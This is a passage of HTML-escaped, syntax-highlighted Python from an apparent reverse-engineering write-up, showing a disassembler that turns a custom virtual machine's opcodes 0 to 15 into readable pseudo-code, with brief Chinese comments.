        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] += memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;:
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] = memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] - memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;:
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] *= memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;:
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] = memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] / memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;:
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] %= memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] % memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;:
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] &amp;amp;= memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;:
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] |= memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;:
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] ^= memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]] = memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)
        &lt;span style=&#34;color:#75715e&#34;&gt;# print (&amp;#34;%04x:  &amp;#34; % i, f&amp;#34;index -= 2&amp;#34;)&lt;/span&gt;
        index &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] = memory[memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]]&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;:    &lt;span style=&#34;color:#75715e&#34;&gt;#和case 11的情况一样&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] = (1 if memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] == 0 else 0)&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] = (1 if memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] &amp;lt; 0 else 0)&amp;#34;&lt;/span&gt;)
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;:    &lt;span style=&#34;color:#75715e&#34;&gt;#这个再仔细看看，不确定性有点高，脑袋有点糊&lt;/span&gt;
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] = memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;], memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;]&amp;#34;&lt;/span&gt;)        
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i,  &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;index -= 1      # index = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{index}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)
        index &lt;span style=&#34;color:#f92672&#34;&gt;-=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;:
        print (&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;memory[&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;index&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;] = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(opcode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;, signed&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;)&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;)        &lt;span style=&#34;color:#75715e&#34;&gt;# print (&amp;#34;%04x:  &amp;#34; % i, &amp;#34;i += 5&amp;#34;)&lt;/span&gt;
        index &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
        i &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;elif&lt;/span&gt; cur_op &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;:
        print(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;%04x&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;:  &amp;#34;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; i, &lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;i = &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;hex((int&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;from_bytes(opcode[i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;: i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;], &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;little&amp;#39;&lt;/span&gt;, signed&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;False&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&lt;/span&gt; &lt;span 